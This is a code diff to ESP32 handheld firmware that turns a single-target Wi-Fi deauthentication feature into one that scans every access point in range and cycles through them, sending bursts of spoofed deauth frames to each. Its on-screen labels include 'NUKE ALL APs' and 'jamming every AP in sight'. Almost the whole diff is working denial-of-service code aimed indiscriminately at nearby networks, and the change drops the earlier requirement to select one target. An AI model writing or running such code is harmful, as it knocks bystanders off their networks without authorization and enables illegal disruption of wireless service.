@@ -10,8 +10,14 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
 
-/* ========== Broadcast deauth: attack every client of an AP ========== */
+/* ========== Broadcast deauth: nuke every AP in range ========== */
 
+#define DB_MAX_APS 48
+
+struct db_target_t { uint8_t bssid[6]; uint8_t channel; char ssid[24]; };
+static db_target_t s_b_targets[DB_MAX_APS];
+static volatile int s_b_target_n = 0;
+static volatile int s_b_cursor = 0;
 static volatile bool     s_b_running = false;
 static volatile uint32_t s_b_sent    = 0;
 
@@ -24,59 +30,134 @@ static uint8_t s_b_frame[26] = {
     0x07, 0x00,
 };
 
-static uint8_t s_b_target[6];
-static uint8_t s_b_channel;
-
 static void broad_task(void *)
 {
-    esp_wifi_set_channel(s_b_channel, WIFI_SECOND_CHAN_NONE);
-    memcpy(s_b_frame + 10, s_b_target, 6);
-    memcpy(s_b_frame + 16, s_b_target, 6);
+    /* Rotate through every AP: hop channel, blast a burst of deauths,
+     * move on. Fastest total coverage. */
     while (s_b_running) {
-        esp_wifi_80211_tx(WIFI_IF_STA, s_b_frame, sizeof(s_b_frame), false);
-        s_b_sent++;
-        delay(50);
+        if (s_b_target_n == 0) { delay(100); continue; }
+        const db_target_t &t = s_b_targets[s_b_cursor % s_b_target_n];
+        esp_wifi_set_channel(t.channel ? t.channel : 1, WIFI_SECOND_CHAN_NONE);
+        memcpy(s_b_frame + 10, t.bssid, 6);
+        memcpy(s_b_frame + 16, t.bssid, 6);
+        for (int i = 0; i < 12 && s_b_running; ++i) {
+            esp_wifi_80211_tx(WIFI_IF_STA, s_b_frame, sizeof(s_b_frame), false);
+            s_b_sent++;
+            delay(4);
+        }
+        s_b_cursor++;
     }
     vTaskDelete(nullptr);
+}
+
+static void db_scan_populate(void)
+{
+    s_b_target_n = 0;
+    int n = WiFi.scanNetworks(false, true, false, 120);
+    if (n <= 0) return;
+    for (int i = 0; i < n && s_b_target_n < DB_MAX_APS; ++i) {
+        db_target_t &t = s_b_targets[s_b_target_n++];
+        memcpy(t.bssid, WiFi.BSSID(i), 6);
+        t.channel = WiFi.channel(i);
+        strncpy(t.ssid, WiFi.SSID(i).c_str(), sizeof(t.ssid) - 1);
+        t.ssid[sizeof(t.ssid) - 1] = '\0';
+    }
+    WiFi.scanDelete();
 }
 
 void feat_wifi_deauth_broadcast(void)
 {
     radio_switch(RADIO_WIFI);
     WiFi.mode(WIFI_STA);
-    esp_wifi_set_promiscuous(true);
 
-    if (!g_last_selected_valid) {
-        ui_toast("scan+select AP first", COL_WARN, 1500);
-        esp_wifi_set_promiscuous(false);
+    auto &d = M5Cardputer.Display;
+    ui_clear_body();
+    d.setTextColor(COL_WARN, COL_BG);
+    d.setCursor(4, BODY_Y + 2); d.print("NUKING ALL APs");
+    d.setTextColor(COL_DIM, COL_BG);
+    d.setCursor(4, BODY_Y + 20); d.print("scanning 2.4 GHz...");
+    ui_draw_footer("scanning");
+    ui_radar(SCR_W / 2, BODY_Y + 60, 24, COL_ACCENT);
+
+    db_scan_populate();
+    if (s_b_target_n == 0) {
+        ui_toast("no APs found", COL_BAD, 1500);
         return;
     }
-    memcpy(s_b_target, g_last_selected_ap.bssid, 6);
-    s_b_channel = g_last_selected_ap.channel ? g_last_selected_ap.channel : 1;
+
+    esp_wifi_set_promiscuous(true);
     s_b_sent = 0;
+    s_b_cursor = 0;
     s_b_running = true;
-    xTaskCreate(broad_task, "deauth_b", 3072, nullptr, 4, nullptr);
+    xTaskCreate(broad_task, "deauth_all", 3072, nullptr, 4, nullptr);
+
+    /* Dramatic intro. */
+    ui_action_overlay("NUKE LAUNCHED", "jamming every AP in sight",
+                      ACT_BG_GLITCH, COL_BAD, 900);
 
     ui_clear_body();
     ui_draw_footer("`=stop");
-    auto &d = M5Cardputer.Display;
-    d.setTextColor(COL_BAD, COL_BG);
-    d.setCursor(4, BODY_Y + 2); d.print(">> BCAST DEAUTH <<");
-    d.setTextColor(COL_FG, COL_BG);
-    d.setCursor(4, BODY_Y + 22);
-    d.printf("%02X:%02X:%02X:%02X:%02X:%02X ch%u",
-             s_b_target[0], s_b_target[1], s_b_target[2],
-             s_b_target[3], s_b_target[4], s_b_target[5], s_b_channel);
-
     uint32_t last = 0;
+    uint32_t last_flash = 0;
+    int last_cur = -1;
+    uint32_t last_sent = 0;
     while (true) {
-        if (millis() - last > 300) {
-            last = millis();
-            d.fillRect(0, BODY_Y + 40, SCR_W, 30, COL_BG);
-            d.setTextColor(COL_GOOD, COL_BG);
-            d.setCursor(4, BODY_Y + 40);
-            d.printf("frames: %lu", (unsigned long)s_b_sent);
-            ui_draw_status(radio_name(), "dbcast");
+        uint32_t now = millis();
+
+        /* Red border flash for 60ms whenever target rotates. */
+        int cur = s_b_target_n ? (s_b_cursor % s_b_target_n) : 0;
+        if (cur != last_cur) {
+            last_cur = cur;
+            last_flash = now;
+        }
+        bool flashing = (now - last_flash) < 60;
+
+        if (now - last > 200) {
+            last = now;
+            ui_clear_body();
+
+            /* Hex stream backdrop — evokes packet storm. */
+            ui_hexstream(0, BODY_Y + 4, SCR_W, BODY_H - 8, 0x4800);
+
+            /* Red border on flash. */
+            if (flashing) {
+                d.drawRect(0, BODY_Y, SCR_W, BODY_H, COL_BAD);
+                d.drawRect(1, BODY_Y + 1, SCR_W - 2, BODY_H - 2, COL_BAD);
+            }
+
+            d.setTextColor(COL_BAD, COL_BG);
+            d.setCursor(4, BODY_Y + 2); d.print(">> DEAUTH ALL <<");
+            d.drawFastHLine(4, BODY_Y + 12, 120, COL_BAD);
+
+            d.setTextColor(COL_FG, COL_BG);
+            d.setCursor(4, BODY_Y + 16);
+            d.printf("targets: %d", s_b_target_n);
+            d.setCursor(4, BODY_Y + 26);
+            d.printf("frames : %lu", (unsigned long)s_b_sent);
+            uint32_t fps = (now - last > 0) ? (s_b_sent - last_sent) * 5 : 0;
+            last_sent = s_b_sent;
+            d.setTextColor(fps > 40 ? COL_GOOD : COL_WARN, COL_BG);
+            d.setCursor(4, BODY_Y + 36);
+            d.printf("rate   : %lu/s", (unsigned long)fps);
+
+            /* Live EQ bars pulsing with frame rate. */
+            ui_eq_bars(SCR_W - 70, BODY_Y + 16, 4, 28, COL_BAD);
+
+            const db_target_t &t = s_b_targets[cur];
+            d.setTextColor(COL_ACCENT, COL_BG);
+            d.setCursor(4, BODY_Y + 50);
+            d.printf("> %.20s", t.ssid[0] ? t.ssid : "<hidden>");
+            d.setTextColor(COL_DIM, COL_BG);
+            d.setCursor(4, BODY_Y + 62);
+            d.printf("ch%u  %02X:%02X:%02X:%02X:%02X:%02X",
+                     t.channel,
+                     t.bssid[0], t.bssid[1], t.bssid[2],
+                     t.bssid[3], t.bssid[4], t.bssid[5]);
+
+            /* Mini radar sweeping over target. */
+            ui_radar(SCR_W - 14, BODY_Y + BODY_H - 14, 9, COL_BAD);
+
+            ui_draw_status(radio_name(), "NUKE-ALL");
         }
         uint16_t k = input_poll();
         if (k == PK_NONE) { delay(20); continue; }
@@ -85,7 +166,6 @@ void feat_wifi_deauth_broadcast(void)
     s_b_running = false;
     delay(150);
     esp_wifi_set_promiscuous(false);
-    g_last_selected_valid = false;
 }
 
 /* ========== Deauth detector: passively count deauth frames ========== */
